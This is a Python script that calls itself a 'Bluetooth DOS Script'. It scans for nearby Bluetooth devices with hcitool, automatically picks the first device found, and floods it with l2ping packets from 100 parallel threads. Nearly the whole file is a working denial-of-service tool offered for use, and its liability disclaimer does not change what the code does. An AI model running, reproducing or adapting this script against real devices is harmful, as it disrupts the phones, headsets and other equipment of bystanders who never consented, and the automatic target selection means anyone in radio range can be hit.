import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')

def printLogo():
    print('                            Bluetooth DOS Script                            ')

def main():
    printLogo()
    time.sleep(0.1)
    print('\n\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
    time.sleep(1)
    os.system('clear')
    printLogo()
    print('\nScanning ...')

    output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
    lines = output.splitlines()
    del lines[0]
    
    devices = []
    print("|id   |   mac_addres  |   device_name|")
    for id, line in enumerate(lines):
        info = line.split()
        mac = info[0]
        devices.append(mac)
        print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")

    target_id = 0  # Automatically select the first device
    target_addr = devices[target_id] if target_id < len(devices) else ""

    if not target_addr:
        print('[!] ERROR: Target addr is missing')
        exit(0)

    packages_size = 600  # Default package size
    threads_count = 100  # Default number of threads

    print('\n\x1b[31m[*] Starting DOS attack in 3 seconds...')

    for i in range(3, 0, -1):
        print(f'[*] {i}')
        time.sleep(1)

    os.system('clear')
    print('[*] Building threads...\n')

    for i in range(threads_count):
        print(f'[*] Built thread №{i + 1}')
        threading.Thread(target=DOS, args=(target_addr, packages_size)).start()

    print('[*] Built all threads...')
    print('[*] Starting...')

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print(f'[!] ERROR: {e}')
